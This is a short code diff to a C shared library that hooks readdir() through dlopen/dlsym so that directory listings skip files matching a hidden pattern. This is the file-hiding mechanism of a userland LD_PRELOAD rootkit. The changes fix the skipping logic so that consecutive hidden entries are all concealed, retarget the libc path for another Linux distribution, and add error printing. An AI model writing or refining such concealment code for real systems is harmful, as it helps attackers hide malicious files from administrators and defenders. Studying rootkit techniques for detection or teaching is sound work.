@@ -30,7 +30,7 @@ struct dirent *readdir(DIR *dirp)
 {
         struct dirent *d = libc_readdir(dirp);
 
-        if (d != NULL && strstr(d->d_name, HIDE_PATTERN)) {
+        while (d != NULL && strstr(d->d_name, HIDE_PATTERN)) {
                 /* We match the HIDE_PATTERN, so let's skip to the 
                  * next entry in the FS 
                  */
@@ -42,8 +42,11 @@ struct dirent *readdir(DIR *dirp)
 
 void _init(void)
 {
-        void *dl = dlopen("/lib64/libc-2.17.so", RTLD_NOW);
-
+        void *dl = dlopen("/lib/x86_64-linux-gnu/libc-2.23.so", RTLD_NOW);
+        char *err;
+        if ((err = dlerror()) != NULL) {
+                printf("%s\n", err);
+        }
         libc_opendir = dlsym(dl, "opendir");
         libc_readdir = dlsym(dl, "readdir");
 }
